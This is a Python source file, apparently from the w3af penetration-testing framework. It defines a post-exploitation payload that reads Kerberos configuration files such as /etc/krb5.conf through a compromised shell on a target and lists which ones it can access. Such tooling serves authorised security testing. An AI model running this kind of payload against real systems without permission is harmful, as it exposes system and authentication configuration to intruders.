import re
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class kerberos_config_files(Payload):
    """
    This payload shows Kerberos configuration files
    """
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/krb5.conf')
        files.append('/etc/krb5/krb5.conf')
        #files.append('c:\winnt\krb5.ini')

        for file in files:
            content = self.shell.read(file)
            if content:
                result[file] = content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'Kerberos config files not found.'
        else:
            rows = []
            rows.append(['Kerberos file', 'Read access'])
            rows.append([])
            for filename in api_result:
                rows.append([filename, 'Yes'])
                rows.append([])

            result_table = table(rows[:-1])
            result_table.draw(80)
            return rows
